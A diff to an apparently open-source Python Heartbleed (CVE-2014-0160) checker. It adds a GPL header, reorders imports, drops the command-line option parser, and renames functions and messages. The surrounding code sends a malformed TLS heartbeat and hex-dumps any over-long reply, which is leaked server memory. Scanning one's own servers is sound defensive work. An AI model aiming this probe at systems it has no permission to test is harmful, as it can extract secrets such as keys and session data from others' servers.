@@ -1,21 +1,33 @@
+"""
+#Author: Renato Vieira, Adley Silva, Claudio Carvalho 
+
+# This program is distributed in the hope that it will be useful,
+# but WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE  See the
+# GNU General Public License for more details. http://www.gnu.org/licenses/.
+
+Requirements:
+Python 3.4.0 - Python.org
+TLSFuzzer - https://github.com/tomato42/tlsfuzzer
+tlslite-ng - https://github.com/tomato42/tlslite-ng
+ECDSA - https://github.com/warner/python-ecdsa
+
+
+More information at:
+https://sslvulnerabilitychecker.com
+https://github.com/vieira22/SSLChecker
+"""
 
 
 import sys
-import struct
-import socket
-import time
 import select
-import re
+import struct
 import codecs
-from optparse import OptionParser
+import time
+import socket
+
 
 decode_hex = codecs.getdecoder('hex_codec')
-
-options = OptionParser(usage='%prog server [options]',
-                       description='Test for SSL heartbeat vulnerability (CVE-2014-0160)')
-options.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)')
-options.add_option('-s', '--starttls', action='store_true', default=False, help='Check STARTTLS')
-options.add_option('-d', '--debug', action='store_true', default=False, help='Enable debug output')
 
 
 def h2bin(x):
@@ -46,7 +58,7 @@ hb = h2bin('''
         ''')
 
 
-def hexdump(s):
+def hex(s):
     for b in range(0, len(s), 16):
         lin = [c for c in s[b: b + 16]]
         hxdat = ' '.join('%02X' % c for c in lin)
@@ -89,31 +101,31 @@ def recvmsg(s):
     if pay is None:
         print('Unexpected EOF receiving record payload - server closed connection')
         return None, None, None
-    print(' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay)))
+    print(' ... received: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay)))
     return typ, ver, pay
 
 
-def hit_hb(s):
+def hit(s):
     s.send(hb)
     while True:
         typ, ver, pay = recvmsg(s)
         if typ is None:
-            # print('No heartbeat response received, server likely not vulnerable')
-            print('Server likely not vulnerable')
+            # print('No heartbeat received, server very likely not vulnerable')
+            print('Server very likely not vulnerable')
             return False
 
         if typ == 24:
             print('Received heartbeat response:')
-            hexdump(pay)
+            hex(pay)
             if len(pay) > 3:
-                print('WARNING: server returned more data than it should - server is vulnerable!')
+                print('WARNING - server returned more data than it should - server very likely vulnerable!')
             else:
                 print('Server processed malformed heartbeat, but did not return any extra data.')
             return True
 
         if typ == 21:
             print('Received alert:')
-            hexdump(pay)
+            hex(pay)
             # print('Server returned error, likely not vulnerable')
             print('Server likely not vulnerable')
             return False
@@ -167,7 +179,7 @@ def main(url):
     print('Sending heartbeat request...')
     sys.stdout.flush()
     s.send(hb)
-    hit_hb(s)
+    hit(s)
 
 
 if __name__ == '__main__':
